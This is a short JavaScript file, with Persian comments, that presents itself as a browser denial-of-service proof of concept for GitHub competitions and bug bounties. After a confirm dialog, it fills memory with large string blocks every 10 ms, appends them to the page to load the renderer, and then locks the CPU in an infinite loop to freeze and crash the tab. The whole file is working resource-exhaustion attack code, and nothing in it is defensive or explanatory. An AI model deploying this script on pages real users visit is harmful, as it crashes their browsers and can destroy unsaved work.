/**
 * NEXUS OS - Browser Stability & DoS PoC
 * مخصوص مسابقات گیت‌هاب - تست نفوذ و باگ بانتی
 */

document.getElementById('startTest').addEventListener('click', function() {
    // اصلاح نام متغیر از confirmation به confirmAction
    const confirmAction = confirm("هشدار امنیتی: این تست باعث اشغال ۱۰۰٪ منابع و کرش تب می‌شود. ادامه می‌دهید؟");
    
    if (confirmAction) {
        console.log("تست نفوذ آغاز شد...");
        heavyCrash();
    }
});

function heavyCrash() {
    // ۱. فریز کردن آنی رابط کاربری (UI Blocking)
    // این بخش باعث می‌شود مرورگر دیگر به هیچ کلیکی پاسخ ندهد
    const freezeUI = () => {
        while(true) {
            // ایجاد بار محاسباتی سنگین
            Math.sqrt(Math.random() * 9999999);
        }
    };

    // ۲. پر کردن رم با سرعت وحشتناک (Memory Exhaustion)
    // استفاده از شئی (Object) برای جلوگیری از پاکسازی توسط مرورگر
    let storage = {};
    let count = 0;

    setInterval(() => {
        // ایجاد بلاک‌های ۵۰ مگابایتی در هر ۱۰ میلی‌ثانیه
        let bigData = new Array(1000000).fill("CRASH_REZA_NEXUS_" + Math.random()).join('###');
        storage['block_' + count] = bigData;
        count++;

        // اضافه کردن همزمان به صفحه برای درگیر کردن پردازنده گرافیکی
        let blob = document.createElement('div');
        blob.innerHTML = bigData;
        document.body.appendChild(blob);

        console.log("Allocated Blocks: " + count);
        
        // وقتی رم به مرز انفجار رسید، پردازنده را قفل کن
        if (count > 50) {
            freezeUI();
        }
    }, 10);
}

